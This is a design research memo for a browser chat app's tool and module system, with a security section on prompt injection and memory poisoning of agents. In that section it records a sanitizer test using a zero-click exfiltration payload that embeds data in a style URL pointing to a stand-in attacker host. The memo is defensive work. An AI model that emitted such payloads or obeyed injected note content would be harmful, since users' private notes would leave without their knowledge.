# Modular abilities and local search for ORFE

Researched 2026-11-01. Language notes: "Inferences" are my reasoning, not sourced facts. Where a figure is my own arithmetic, the note says so.

Search tool warning: most web results came through a summariser. Where I could not open the primary page, the note says "secondary" or "snippet only".

## How do Agent Skills, MCP, OpenAI Apps and client plugin systems structure modules? What is proven, and what became bloat?

### Takeaway
The proven shape is small: a text manifest, a short always-visible description, longer instructions loaded on demand, tools as JSON Schema data, and a handler. TypingMind is the closest model for ORFE. The bloat came from large always-loaded tool lists, stateful protocol features, and open marketplaces.

Recommendation: a static TypeScript registry of abilities, where tools are plain data and one host function decides how they reach the model. Do not build a plugin loader, marketplace or MCP dependency now.

### Cited Findings

Agent Skills:
- A skill is a directory with a required `SKILL.md`, plus optional `scripts/`, `references/` and `assets/`. Frontmatter requires `name` (max 64 characters) and `description` (max 1024 characters, says what it does and when to use it) — [Agent Skills spec](https://agentskills.io/specification)
- Disclosure has three levels: metadata at about 100 tokens loaded at startup for all skills; the body at under 5000 tokens when activated; resources only when needed. Keep `SKILL.md` under 500 lines, and keep file references one level deep — [Agent Skills spec](https://agentskills.io/specification)
- `allowed-tools` is experimental, and support varies between agents — [Agent Skills spec](https://agentskills.io/specification)
- Supply-chain failure: Snyk scanned 3,984 skills from ClawHub and skills.sh. 1,467 (36.82%) had a security issue, 534 (13.4%) had a critical issue, and 76 held confirmed malicious payloads. Skills inherit full agent permissions, and publishing needs only a SKILL.md and a one-week-old GitHub account — [Snyk ToxicSkills](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub) (secondary summary). One critic notes that 1,721 of 5,705 ClawHub skills were not scanned — [Vaughan](https://codex.danielvaughan.com/2026/06/07/agent-skill-supply-chain-crisis-clawhavoc-toxicskills-skillsieve-codex-cli-defence/)

MCP:
- The 2026-07-28 revision removed protocol sessions, the `initialize` handshake, the HTTP GET stream, `ping` and SSE resumability. It deprecated Roots, Sampling and Logging. It moved tasks into an extension. It deprecated Dynamic Client Registration — [MCP changelog](https://modelcontextprotocol.io/specification/2026-07-28/changelog)
- The same revision says servers SHOULD return tools in a deterministic order, partly to improve LLM prompt cache hit rates — [MCP changelog](https://modelcontextprotocol.io/specification/2026-07-28/changelog)
- The token cost of raw MCP: a five-server setup with 58 tools used about 55K tokens before the conversation started. GitHub alone was 35 tools and about 26K tokens. Slack was 11 tools and about 21K. Anthropic saw 134K tokens before optimising — [Anthropic, advanced tool use](https://www.anthropic.com/engineering/advanced-tool-use)

OpenAI Apps and MCP Apps:
- MCP Apps (SEP-1865) renders server UI in sandboxed iframes with a deny-by-default CSP. Host and iframe talk JSON-RPC over postMessage. It builds on MCP-UI and the OpenAI Apps SDK — [Morph](https://www.morphllm.com/mcp-apps) (secondary). Sources disagree on whether it was stable in January 2026 or shipped as official with the 2026-07-28 release. I did not verify OpenAI's own docs.

Client plugin systems:
- TypingMind (a browser app, the closest match) defines a plugin as: name, overview, auth, user settings as a JSON field array, "plugin context" added to the system prompt, permissions, and functions with OpenAI function specs. Each function runs as JavaScript, an HTTP action, or an MCP server. Output can go to the AI or render to the user — [TypingMind docs](https://docs.typingmind.com/plugins/build-a-typingmind-plugin)
- TypingMind JavaScript runs in an iframe with `allow-scripts` and `allow-modals`. The docs say this isolates but is not a full security boundary. Network is on by default. `networkAccess: false` applies a CSP that blocks fetch, WebSockets and remote scripts. HTTP actions run from the browser, so CORS applies — [TypingMind docs](https://docs.typingmind.com/plugins/build-a-typingmind-plugin)
- TypingMind's separate "Extensions" feature has access to all internal data and app state — [TypingMind extensions](https://docs.typingmind.com/typingmind-extensions.md) (snippet only)
- Open WebUI Tools are Python modules run by the server, and the project treats this as intended behaviour — [Open WebUI disposition](https://docs.openwebui.com/security/vendor-dispositions/cve-2026-0766.txt). CVEs followed around it, for example `exec()` without sandboxing in CVE-2025-64496 — [Cato](https://www.catonetworks.com/?p=141196)
- SillyTavern installs third-party extensions from a repository URL and warns that they may pose security risks. The docs do not state what they can access — [SillyTavern docs](https://docs.sillytavern.app/extensions/index.md). A third-party extension called Bot Browser was reported to exfiltrate API keys — [r/SillyTavernAI mirror](https://redlib.groet-infra.nl/r/SillyTavernAI) (weak source, not verified)
- LibreChat attaches MCP servers to agents through a server config, and supports deferred tools — [LibreChat MCP docs](https://www.librechat.ai/docs/features/mcp.md). It has a backend, so it does not transfer directly.
- Cherry Studio configures MCP servers including STDIO commands, as a desktop app — [Cherry Studio docs](https://docs.cherry-ai.com/docs/en-us/advanced-basic/mcp/config)
- Hermes keeps memory as a frozen snapshot: it loads once at session start and does not change mid-session, explicitly to protect the prefix cache — [Hermes docs](https://hermes-agent.nousresearch.com/docs/user-guide/features/memory)

### Inferences

What transfers to ORFE:
- Keep: one-line description, instructions on demand, tools as JSON Schema, settings as a field list, declared permissions.
- Drop: scripts, shells, subprocess transports, marketplaces, dynamic code loading.
- MCP's own 2026 revision is the best evidence of what was bloat. It deleted the stateful parts and kept tools.

Proposed shape (design sketch, not sourced):

```ts
interface Ability {
  id: string                    // 'notes'; also the tool name prefix
  version: number
  title: string                 // shown on the toggle
  summary: string               // about 100 tokens; used in a catalogue
  instructions?: string         // short usage note, sent only when on
  tools: ToolDef[]              // data only: name, description, JSON Schema, risk
  run(call, ctx): Promise<ToolResult>
  hooks?: { beforeSend?(plan, ctx): plan }   // compaction lives here, not as a tool
  settings?: Field[]            // TypingMind-style field list
  traits: { private?: true; untrusted?: true; outward?: true }  // see security section
}
```

- `ctx` should be a narrow API, not the Dexie handle. This keeps `src/lib/storage.ts` as the only Dexie seam.
- Compaction shows why an ability needs two kinds of parts. It changes the send plan and is not a tool the model calls. History search is a tool. Notes are tools plus maybe pinned text.
- One host function, for example `toolsFor(chat, model)`, should decide exposure. Direct tools come first. A dispatcher can be added later without changing any ability. This is the "swap" seam.
- A static array in `src/abilities/index.ts` is enough. Each ability is one folder. Adding one is one import line.
- Per-chat state is a list of ability ids on the conversation. A per-model override may be needed because not every model supports tools.
- User-made modules are a later question with a separate trust level (see security section).

### Gaps
- Chatbox: I found nothing usable.
- OpenAI Apps SDK: I relied on secondary sources.
- I found no study that measures module-format choices directly. The "proven" judgement is my reading of adoption and failures.

## How many tools can a model handle? What is known about description size, tool search, and one generic tool versus many narrow ones?

### Takeaway
Stay at or below about 12 tools per request. Quality loss is gradual and depends on the model, and similar tools hurt more than the raw count. ORFE cannot rely on provider tool search across models, so toggles need a client-side answer.

Recommendation: narrow prefixed tools, fixed order, and accept one cold turn per toggle. Keep a dispatcher as a later option once the installed set grows past about 12 tools.

### Cited Findings

Tool count:
- OpenAI advises aiming for fewer than 20 functions at the start of a turn, as a soft suggestion — [OpenAI function calling](https://developers.openai.com/api/docs/guides/function-calling)
- Anthropic says Claude's selection degrades past 30 to 50 tools, and recommends tool search at 10 or more tools or over 10K tokens of definitions — [Anthropic tool search](https://platform.claude.com/docs/en/agents-and-tools/tool-use/tool-search-tool)
- A 2026 Linköping bachelor's thesis ran through OpenRouter with confusable distractor tools. Every model got worse as tools grew. Failures were wrong tool or no call, and malformed calls were rare. Strict success by toolset size — [Wiberg and Diana 2026](https://liu.diva-portal.org/smash/get/diva2:2072520/FULLTEXT01.pdf):

| Tools | gpt-5.4-nano | gemini-2.5-flash-lite | gpt-oss-20b | gpt-oss-120b | minimax-m2.7 |
|---|---|---|---|---|---|
| 4 | 0.70 | 0.67 | 0.81 | 0.74 | 0.79 |
| 8 | 0.72 | 0.53 | 0.79 | 0.81 | 0.70 |
| 16 | 0.51 | 0.56 | 0.69 | 0.68 | 0.70 |
| 32 | 0.52 | 0.53 | 0.73 | 0.79 | 0.81 |
| 128 | 0.36 | 0.50 | 0.62 | 0.66 | 0.65 |

- Caveats from that thesis: single run, single-call tasks, synthetic catalogue, free-tier endpoints, a limited case count, and small proprietary models only. The curves are noisy — [Wiberg and Diana 2026](https://liu.diva-portal.org/smash/get/diva2:2072520/FULLTEXT01.pdf)
- FunctionChat-Bench found no clear decline within 1 to 8 candidates. Similarity between functions correlated with accuracy — [FunctionChat-Bench](https://arxiv.org/pdf/2411.14054) (snippet only)
- GitHub cut Copilot's default tools from 40 to 13 and reports 2 to 5 percentage points better success on benchmarks with GPT-5 and Sonnet 4.5 — [GitHub blog](https://github.blog/ai-and-ml/github-copilot/how-were-making-github-copilot-smarter-with-fewer-tools/) (vendor figures, read through a summary)
- Anthropic warns that overlapping tools distract agents, and advises consolidating workflows into fewer tools and prefixing names by service. Prefix versus suffix naming has measurable effects that vary by model. A concise response mode used about a third of the tokens in a Slack example. Claude Code caps tool responses at 25,000 tokens — [Anthropic, writing tools](https://www.anthropic.com/engineering/writing-tools-for-agents)

Description size:
- The Anthropic numbers above work out to about 950 tokens per tool across the set, about 740 for GitHub and about 1,900 for Slack (my arithmetic) — [Anthropic, advanced tool use](https://www.anthropic.com/engineering/advanced-tool-use)

Tool search and deferred loading:
- With tool search, Anthropic's example went from about 77K to about 8.7K tokens. MCP eval accuracy rose from 49% to 74% on Opus 4 and from 79.5% to 88.1% on Opus 4.5 — [Anthropic, advanced tool use](https://www.anthropic.com/engineering/advanced-tool-use)
- `defer_loading` still sends all definitions in each request, but keeps deferred tools out of the prefix. Discovered tools arrive as `tool_reference` blocks in the messages, so the cache survives. Keep the 3 to 5 most used tools always loaded — [Anthropic tool search](https://platform.claude.com/docs/en/agents-and-tools/tool-use/tool-search-tool)
- Claude's cache order is tools, then system, then messages. Changing tool definitions invalidates everything — [Anthropic tool caching](https://platform.claude.com/docs/en/agents-and-tools/tool-use/tool-use-with-prompt-caching)
- OpenAI tool search works only on `gpt-5.4` and later — [OpenAI function calling](https://developers.openai.com/api/docs/guides/function-calling)
- OpenRouter says `tools` must be included in every request. Its tool page does not mention deferred loading or MCP — [OpenRouter tool calling](https://openrouter.ai/docs/guides/features/tool-calling). Its server tools (web search, web fetch, datetime, image generation) are static entries in the same array, in beta — [OpenRouter server tools](https://openrouter.ai/docs/guides/features/server-tools/overview)

Cache prices, from OpenRouter's table — [OpenRouter prompt caching](https://openrouter.ai/docs/guides/best-practices/prompt-caching):
- Claude: writes 1.25x, reads 0.1x, minimum 512 to 4,096 tokens by model, TTL 5 minutes or 1 hour.
- DeepSeek: automatic, reads 0.1x, writes at the input price.
- Grok: automatic, writes free, reads 0.25x.
- Provider stickiness lasts 10 minutes after the last request. The page does not describe how tool definitions are cached.

One generic tool versus many:
- Cloudflare exposes its whole API through two tools, `search` and `execute`, at about 1,000 tokens versus over 2 million. The model writes code — [Cloudflare](https://blog.cloudflare.com/code-mode-mcp/). A portal case fell from 52 tools to 2, about 600 tokens, a 94% reduction — [Cloudflare enterprise](https://blog.cloudflare.com/enterprise-mcp/). A third party measured 1,264 tokens and noted that token counts do not show task success — [Jahanzaib](https://www.jahanzaib.ai/blog/cloudflare-code-mode-mcp)
- Programmatic calling matched or beat JSON calling in 11 of 14 models on BFCL v4, and stayed stable under context rot, while JSON fell by 2.3% on average — [Patel et al. 2026](https://arxiv.org/abs/2608.06370) (abstract only)
- Anthropic reports 37% lower token use and accuracy gains with programmatic calling on its internal tasks — [Anthropic, advanced tool use](https://www.anthropic.com/engineering/advanced-tool-use)

### Inferences

Think of three toggle strategies:

| Strategy | Toggle cost | Good | Bad |
|---|---|---|---|
| A. Narrow tools, list changes on toggle | One cold turn | Strict schemas. Simple. Every model works. | Each toggle pays once. |
| B. All installed tools always sent | None | Prefix never moves. | Permanent tokens. More distractors. Off abilities must refuse. |
| C. Fixed dispatcher, for example `ability_open` and `ability_call` | None | Portable tool search. Prefix never moves. | Extra round trip. Loose `args` schema. Unmeasured on weak models. |

- I recommend A now. The cost of one toggle is one turn. On Claude that turn costs about 12.5x a warm turn for the cached part (1.25 versus 0.1, my arithmetic). On Grok-style pricing it costs 4x. It happens once. ORFE's rolling window already accepts cold turns.
- C is a future mode, not a rewrite. If tools are data, `toolsFor()` can change strategy later.
- Prompts under the provider's minimum never cache, so toggling in a young chat should cost nothing.

Rules that make toggles rare or cheap:
- Sort tools in a fixed order by ability id then tool name. Serialise with stable key order.
- Apply a mid-chat toggle at once, but show a small "next turn is cold" hint. If `isCold` already holds, there is no extra cost. This is the cheap case: idle chats toggle for free.
- Do not put per-toggle text in the system message. It sits ahead of the messages, so a change there also breaks the cache. Send ability instructions in the tool description, or append them as a late message.
- Freeze pinned notes at chat start, as Hermes does.
- Default sets could be attached to a prompt or persona, so most chats start right and never toggle.

Local code point: `fingerprint()` in `src/lib/context.ts` (line 50) hashes only messages. Once tools exist, it must also hash the tool list. Otherwise `isCold` will read warm after a toggle, and trimming logic will be wrong.

Size budget (my suggestion, not measured): 5 tools per ability at most, 100 to 250 tokens per tool, and about 1K tokens total per ability. This is far below the MCP figures because the tools are hand-written.

The Copilot and thesis results point the same way: name collisions matter more than count. `notes_search` and `history_search` are the risky pair. Their descriptions must say clearly what each covers.

Programmatic calling is promising but needs a code sandbox, so it is a later idea.

### Gaps
- No measurement of a plain dispatcher tool (not code mode) against narrow tools, especially on open models.
- I do not know whether OpenRouter passes Anthropic's `defer_loading` through. Its tool page is silent. Needs a live test.
- I found no per-provider statement that tool definitions sit in the cached prefix, except for Claude. Assume yes, then check `cached_tokens` in usage.
- No flagship model data at small tool counts. The thesis used small models.

## Can a browser PWA act as an MCP client today? What works in Chrome on Android in late 2026?

### Takeaway
Yes, for remote Streamable HTTP servers that allow cross-origin requests. Nothing in the spec requires them to. The new stateless revision makes the client very small. stdio is impossible. WebMCP runs the other way and does not help ORFE. A relay is the honest fallback for servers without CORS.

Recommendation: do not build MCP first. Keep the ability shape compatible, so one "remote MCP" ability can map remote tools later.

### Cited Findings

Transport:
- In the 2026-07-28 revision, every message is a POST to one endpoint. Replies are JSON or a request-scoped SSE stream. There are no sessions, and no `initialize` or GET stream — [MCP Streamable HTTP](https://modelcontextprotocol.io/specification/2026-07-28/basic/transports/streamable-http)
- Required request headers are `MCP-Protocol-Version`, `Mcp-Method` and, for calls, `Mcp-Name`. Servers may also demand `Mcp-Param-{name}` headers from tool schemas — [MCP Streamable HTTP](https://modelcontextprotocol.io/specification/2026-07-28/basic/transports/streamable-http)
- Servers MUST validate `Origin` and return 403 when it is invalid. That page does not mention CORS or browser clients at all — [MCP Streamable HTTP](https://modelcontextprotocol.io/specification/2026-07-28/basic/transports/streamable-http)
- Older servers still use `Mcp-Session-Id`, `initialize` and GET. Clients that need both eras probe and fall back — [MCP Streamable HTTP](https://modelcontextprotocol.io/specification/2026-07-28/basic/transports/streamable-http)
- `stdio` means the client launches a subprocess — [MCP transports 2025-11-25](https://modelcontextprotocol.io/specification/2025-11-25/basic/transports)

CORS in practice:
- MCP custom headers are not CORS-safelisted, so servers must list them or the preflight fails. Older servers must also expose `Mcp-Session-Id`, or the browser cannot read it. Examples are in project issues and fixes — [typo3-mcp-server PR](https://github.com/hauptsacheNet/typo3-mcp-server/pull/116), [mitre-mcp issue](https://github.com/Montimage/mitre-mcp/issues/33), [myarchivist PR](https://github.com/Astrotomic/mcp.myarchivist.ai/pull/47)
- OAuth discovery can also fail if `WWW-Authenticate` is not exposed, or if `/mcp` returns 401 to the preflight — [mcp-ts-core issue](https://github.com/cyanheads/mcp-ts-core/issues/687) (snippet only)
- GitHub's MCP server hit a Go SDK check that returned 403 to browser clients. A patch restored it in April 2026 with `Access-Control-Allow-Origin: *`. A maintainer called it a fix for a regression, not a new feature. A later PR dropped the workaround after an SDK update. The only browser client named was the MCP Inspector. An open question there was whether direct browser access is officially supported — [GitHub PR 2359](https://github.com/github/github-mcp-server/pull/2359)
- Apollo documents CORS settings for its MCP server, so some vendors do plan for this — [Apollo docs](https://www.apollographql.com/docs/apollo-mcp-server/cors)

OAuth:
- The 2026-07-28 spec says clients and servers SHOULD support Client ID Metadata Documents. The client ID is an HTTPS URL pointing at a JSON document, and servers advertise support in metadata — [MCP client registration](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/client-registration)
- Dynamic Client Registration is deprecated but remains for older servers — [MCP changelog](https://modelcontextprotocol.io/specification/2026-07-28/changelog)
- Clients must validate a present `iss`, and must key credentials by issuer — [MCP changelog](https://modelcontextprotocol.io/specification/2026-07-28/changelog)
- PKCE is mandatory under OAuth 2.1 — [Zuplo glossary](https://zuplo.com/learn/mcp/glossary/credentials)
- At least one open-source browser client claims end-to-end OAuth with Streamable HTTP and no backend — [mcp_oauth_client_web](https://mcp.so/ja/servers/mcp_oauth_client_web) (not tested)

WebMCP:
- WebMCP lets a page offer tools to an agent. The agent is the browser's, or an extension's, or a site's own — [blink-dev intent](https://groups.google.com/a/chromium.org/g/blink-dev/c/gmYffo5WOE8/m/OJxuQRP3AAAJ)
- The intent lists the trial on desktop, Android and WebView from M149 to M156, with an estimated ship at M157 — [blink-dev intent](https://groups.google.com/a/chromium.org/g/blink-dev/c/gmYffo5WOE8/m/OJxuQRP3AAAJ)
- A tracker updated on 15 October 2026 says the trial now covers Chrome 149 to 162 and ends 30 March 2027, with no ship date. It lists Gemini in Chrome as not available yet and expected in early 2027. It gives no status for Android Chrome. Safari has an opposing position — [WebMCP tracker](https://webmcp.com/ecosystem-tracker). This conflicts with secondary posts calling Gemini in Chrome the confirmed consumer — [OpenHermit](https://www.openhermit.com/blog/webmcp-chrome-149-origin-trial-production-2026)
- The API reportedly moved from `navigator.modelContext` to `document.modelContext` in Chrome 150 — [MCP Playground](https://mcpplaygroundonline.com/blog/what-is-webmcp) (secondary)

### Inferences
- A stateless-only MCP client is about one `fetch` wrapper. ORFE already parses SSE. Support for the older era adds real code, so start with the newer era if this ever happens, and accept that many servers will lag.
- CIMD fits GitHub Pages well. ORFE can publish a static `oauth-client.json` under `/orfe/` and use that URL as its client ID, with no backend. Servers must support it, though.
- Whether a given server works from ORFE is a per-server fact. An app-level "test connection" button would show this honestly.
- From background knowledge, not checked this session: `Access-Control-Allow-Headers: *` does not cover `Authorization`. So wildcard servers can still fail with bearer tokens. Dynamic `Mcp-Param-*` names also cannot be listed in advance unless the server knows its own tools.
- A Cloudflare Worker relay solves CORS, but the relay sees tokens and tool data. It stays optional, per the brief.
- WebMCP only lets ORFE expose its own tools to someone else's agent. That is a different feature. Ignore it for now.
- OpenRouter's `web_fetch` and `web_search` server tools can give ORFE web reading with no CORS issue and no relay. That is a better first "web" ability than generic MCP.
- MCP tool lists can be large. A remote MCP ability needs its own tool picker, so a chat exposes only chosen tools. Otherwise it blows the 12-tool budget at once.

### Gaps
- I found no first-hand test of a browser MCP client in Chrome on Android. Nothing suggests that Android differs from desktop for `fetch` and CORS, but this is unverified.
- OAuth redirects from an installed Android PWA: I found no source on whether the flow returns cleanly to the standalone window.
- I could not build a list of major hosted MCP servers that accept arbitrary browser origins.
- I found no sign that OpenRouter runs remote MCP servers for clients. Its tool page does not mention MCP.
- No published MCP roadmap beyond 2026-07-28 surfaced.

## What should the tool set for a notes vault look like? File-like or record-like? Which edit style gives fewer corrupted writes?

### Takeaway
Use a file-like surface over Dexie records. Use exact unique-match replace as the main edit, with a version check. Avoid diff or patch formats. Safety comes more from the host (version checks, revisions, size caps) than from the edit format, because the model gap is larger than the format gap.

### Cited Findings

File-like tools:
- Anthropic's memory tool has six commands: `view`, `create`, `str_replace`, `insert`, `delete`, `rename`. `/memories` is a prefix that the handler maps to real storage, which can be database keys — [Anthropic memory tool](https://platform.claude.com/docs/en/agents-and-tools/tool-use/memory-tool)
- `str_replace` fails when text is missing, and fails with the line numbers when it appears more than once. Success returns a snippet of the edited file with line numbers. `view` output is line-numbered, and long files truncate past 16,000 characters — [Anthropic memory tool](https://platform.claude.com/docs/en/agents-and-tools/tool-use/memory-tool)
- The docs ask for path validation, size caps, a `view` character cap with paging, and expiry of stale files — [Anthropic memory tool](https://platform.claude.com/docs/en/agents-and-tools/tool-use/memory-tool)
- The tool description says `create` may overwrite, while the reference behaviour returns an error if the file exists. Implementers must choose — [Anthropic memory tool](https://platform.claude.com/docs/en/agents-and-tools/tool-use/memory-tool)
- The API adds a short memory protocol to the system prompt automatically for this tool — [Anthropic memory tool](https://platform.claude.com/docs/en/agents-and-tools/tool-use/memory-tool)
- Letta agents on gpt-4o-mini reached 74.0% on LoCoMo with plain file tools (`grep`, `search_files`, `open`, `close`), beating Mem0's then-reported 68.5%. Letta credits models' training on coding tools — [Letta](https://www.letta.com/blog/benchmarking-ai-agent-memory). Mem0 later claimed 92.5%, and Letta has not rerun the test — [Towards AI](https://pub.towardsai.net/mem0-vs-zep-vs-letta-a-folder-of-text-files-shouldnt-beat-the-61k-star-memory-layer-9d7e65c5799c) (unverified). LoCoMo tests retrieval, not memory writing
- Letta's Context-Bench filesystem suite reportedly showed GPT-5.2-Codex at 93% while many open models stayed below 50% — [AgentMarketCap](https://agentmarketcap.ai/blog/2026/04/05/context-bench-letta-benchmark-agent-memory-long-running-sessions) (secondary)

Record-like tools:
- Hermes uses `add`, `patch` and `remove` over bounded entries (2,200 characters for agent memory, 1,375 for the user profile). Entries are found by a unique substring. Ambiguous matches fail. A write over the limit returns an error rather than dropping entries. It removed `replace` in favour of `patch` — [Hermes docs](https://hermes-agent.nousresearch.com/docs/user-guide/features/memory)

Edit formats (these all test code, not notes):
- Boluk tested 16 models on 180 synthetic tasks, 3 runs each, across patch, str_replace and hashline. Hashline beat patch by up to about 65 points. Hashline versus str_replace ranged from −8.3 to +11.3 points. DeepSeek V3.2 got worse with hashline on both comparisons. Patch failure hit 50.7% for Grok 4 and 46.2% for GLM-4.7 — [Boluk, The Harness Problem](https://stencil.so/blog/the-harness-problem). The author promotes a competing harness, and some chart figures do not fully reconcile
- Hashline rejects a stale edit because the line hash no longer matches — [Boluk](https://stencil.so/blog/the-harness-problem)
- nwyin tested 3 models across 3 languages, 20 tasks each. Hashline was clearly worse on Python, for example gemini-3-flash 95% to 70%, and roughly neutral elsewhere. The model gap (55% to 95%) exceeded the format gap. Fuzzy matching never fired across 134 replace edits. Failures were mostly hallucinated content in `old_string`. The author says the sample is small — [nwyin](https://dev.to/nwyin/hashline-vs-replace-does-the-edit-format-matter-15n2)
- OpenAI recommends strict mode, which needs `additionalProperties: false` and all properties required, with optional fields as nullable — [OpenAI function calling](https://developers.openai.com/api/docs/guides/function-calling)

### Inferences

Recommended tools (5 tools, all plain functions so every model can use them):

| Tool | Purpose | Guard |
|---|---|---|
| `notes_search` | Query, returns path, short snippet, version | Capped results |
| `notes_read` | Numbered lines, optional range; no path lists the tree | Character cap with paging |
| `notes_write` | Create, or replace a whole short note | Replacing needs `expected_version` |
| `notes_edit` | `old_text` to `new_text`, or insert after a line | Unique exact match, `expected_version` |
| `notes_delete` | Soft delete; `new_path` moves instead | Goes to trash, always restorable |

- Anthropic's `memory` tool is provider-specific, so ORFE needs plain function copies for other models. Keep the same names for arguments (`old_str` style) because models know them.
- One tool with a `command` enum saves tokens, as Anthropic does. Separate tools give each action a tighter schema. Format errors were rare in the thesis, so either could work. Mikael's blind A/B method fits this choice well.

Why this set resists corruption:
- Exact match fails loudly. A hallucinated `old_text` returns an error, not damage. This matches nwyin's failure data.
- `expected_version` gives the staleness protection that hashline gives, without changing how models write text. `notes_read` returns the version, and writes refuse a stale one.
- No fuzzy matching. It never helped in nwyin's data and it can hide errors.
- Every write creates a revision row, in the same Dexie transaction. Undo is a UI action. Any bad write is then recoverable, whichever model made it.
- Return a short post-edit snippet so the model sees what happened.
- Add a shrink guard: refuse a whole-note replace that drops more than, say, half the text, unless a flag says so. This guards against a model rewriting from a partial view.
- Follow the repo rule for message writes: re-read inside `db.transaction('rw', …)`.

Storage should be record rows with a path, body, version, tags and timestamps. The model sees files, and the app gets indexes. The "file or record" question is then a surface question, not a storage question.

Short facts (preferences, names) fit Hermes-style bounded entries. They can live in one small pinned note, so no second tool family is needed.

Why not hashline for ORFE: mixed results across models, it is worse on DeepSeek in one test and on some languages in another, and it adds noise to prose. Mikael rates DeepSeek highly, so that row matters.

### Gaps
- No edit-format study on prose or notes. All data is on code, where exact restoration may favour line anchors.
- No measurement of whole-file rewrite drift (silently dropped content) across models.
- No data on `command` enum versus separate tools.
- I did not fetch the original Mem0 or Letta numbers for the later 92.5% claim.

## Security: prompt injection through notes or tool results, the OpenRouter key, and sandboxing future user-made modules

### Takeaway
Prompt injection cannot read the key directly, because the model only acts through tools and rendered output. XSS and module code can read it. The practical risk is data leaving through rendered output or outward tools, and poisoned notes that persist. ORFE has one open zero-click channel today: remote URLs in the `style` attribute. For modules, Web Workers are not a boundary. A sandboxed iframe without `allow-same-origin`, under a strict CSP, is.

### Cited Findings

Threat pattern:
- The "lethal trifecta" is private data, untrusted content and an outward channel. Several sources argue that removing one leg breaks the attack — [Airia](https://airia.com/blog/ai-security-in-2026-prompt-injection-the-lethal-trifecta-and-how-to-defend/) (secondary; the term is Simon Willison's, June 2025)
- Markdown image exfiltration puts private data in an image URL, and rendering sends it with no click — [Wraith](https://wraith.sh/learn/markdown-image-exfiltration)
- EchoLeak against Microsoft 365 Copilot is described as the first public zero-click prompt-injection exfiltration from a production LLM agent — [Anomity](https://anomity.ai/blog/lethal-trifecta-ai-agent-data-exfiltration/) (secondary)
- An allowed image proxy can itself become a leak path, and prompt-level defences reduce rates but are not deterministic. Allowlists and CSP are deterministic — [dev.to field notes](https://dev.to/ahmed_mahmoud360/why-a-better-system-prompt-didnt-stop-prompt-injection-field-notes-on-the-lethal-trifecta-scoped-3kaa), [Wraith](https://wraith.sh/learn/markdown-image-exfiltration)

Memory poisoning:
- Adversarial content written to memory acts in later sessions until it is purged — [MemoryGraft](https://arxiv.org/html/2512.16962)
- An ICML 2026 study sets out six attack classes and reports that existing prompt-injection defences do not cover memory poisoning — [ICML 2026](https://icml.cc/virtual/2026/67964)
- Poison can stay dormant and return across later conversations — [ICML 2026 sleeper paper](https://icml.cc/virtual/2026/67842)
- OWASP's 2026 agentic list reportedly has this as ASI06. Suggested defences include write validation separate from the agent and re-checking memory at retrieval — [Schneider](https://christian-schneider.net/blog/persistent-memory-poisoning-in-ai-agents/) (secondary)
- Hermes scans entries before saving and blocks injection patterns, credential-exfiltration patterns and invisible Unicode, because memory enters the system prompt — [Hermes docs](https://hermes-agent.nousresearch.com/docs/user-guide/features/memory)
- Anthropic's docs ask implementers to consider stripping sensitive data before writing, and to validate every path — [Anthropic memory tool](https://platform.claude.com/docs/en/agents-and-tools/tool-use/memory-tool)

Sandboxing:
- A sandboxed iframe without `allow-same-origin` has an opaque origin. Workers created inside it inherit that. IndexedDB access is refused there — [Web Platform Test](https://searchfox.org/firefox-main/source/testing/web-platform/tests/IndexedDB/idbfactory-databases-opaque-origin.html), [Blackglory notes](https://blackglory.me/notes/web/Web/Sandbox___Running_Untrusted_Code/Web_Workers?variant=en)
- One project runs untrusted code in a worker inside a null-origin iframe, under `default-src 'none'`, with no IndexedDB or network. It warns that if the iframe's file is loaded outside the sandbox, the code runs on the host origin — [fully-isolated-web-workers](https://github.com/manuel/fully-isolated-web-workers)
- TypingMind and MCP Apps both use the sandboxed iframe plus CSP pattern — [TypingMind docs](https://docs.typingmind.com/plugins/build-a-typingmind-plugin), [Morph](https://www.morphllm.com/mcp-apps)

ORFE code, checked this session:
- `src/lib/markdown.ts` uses markdown-it with `html: true`, then DOMPurify with an allowlist. `img` is not allowed. `style` is allowed. A comment says Plan 5 will add a property allowlist. I ran the same config. `<span style="background-image:url(https://evil.example/?d=secret)">` survived sanitising, markdown images were dropped, and a link with data in its URL survived. Whether the browser then fetches that URL depends on the element rendering, and I did not test it in a live page.
- No CSP exists in `index.html` or `vite.config.ts`.

### Inferences

What a malicious note or fetched page can do when the model obeys it:
- It cannot read the OpenRouter key through tools, as long as no tool returns it. Never give abilities a tool or `ctx` call that exposes settings.
- It can make the model print private notes into a `style` URL for a zero-click leak. Fix this before notes ship. It is a small change, and Plan 5 already has it planned, so move it earlier.
- It can make the model output a link holding data, which needs one tap. Showing the full host on links reduces this.
- It can use any tool that takes a URL or sends data. OpenRouter's `web_fetch` with a crafted URL is an outward channel, even though it looks like reading.
- It can write a poisoned note that fires in later chats.
- It can burn credit through tool loops. Cap tool rounds per turn. This also needs a stop button that works mid-loop.

What can steal the key: XSS in rendered output, a dependency, or module code running on the same origin. IndexedDB belongs to the origin, not the path. ORFE's origin is `https://mhuuh.github.io`, so any other GitHub Pages project under that account shares the origin and can read ORFE's IndexedDB. Check whether any other repo publishes there. A custom domain or subdomain would separate it.

Recommended controls, in order:
1. Remove URLs from `style`, or swap in the property allowlist now.
2. Add a CSP through a `<meta>` tag. `connect-src` limited to openrouter.ai and `'self'`, `img-src` to `'self'` and `data:`, `frame-src` as needed. From background knowledge, not checked this session: GitHub Pages cannot set custom headers, and a meta CSP cannot carry every directive, for example `frame-ancestors`.
3. Use ability traits. Each ability declares `private`, `untrusted` or `outward`. If a chat would have all three, the UI warns or refuses. Notes are `private`. Web fetch is `untrusted` and `outward`. This turns the trifecta into one rule that fits a toggle UI.
4. Add a taint bit: after an untrusted tool result in a turn, note writes need a visible confirm, or go to a pending state.
5. Show every note write as a chip in the transcript, with revision undo.
6. Scan note writes for invisible Unicode and known injection shapes, as Hermes does. Treat this as a filter, not a boundary.
7. Wrap tool results as data, with a stated source. This helps only a little, as the sources say prompt-level defences are not deterministic.
8. When notes are auto-loaded, show which ones were loaded.

Sandbox tiers for future modules:
- First-party abilities: compiled into the app. Reviewed code. Same origin.
- User-made tools: a `srcdoc` iframe with `sandbox="allow-scripts"` only, and never `allow-same-origin`. Use postMessage with JSON and a timeout. Default CSP `default-src 'none'`, with network as an explicit per-module grant.
- A Web Worker alone is not a sandbox. A same-origin worker can reach IndexedDB. This is my reading of the same-origin model, consistent with the tests above, which block only opaque-origin contexts.
- `srcdoc` avoids the "file loaded outside the sandbox" risk, because no URL exists to navigate to. This is my reasoning, to check in a spike.
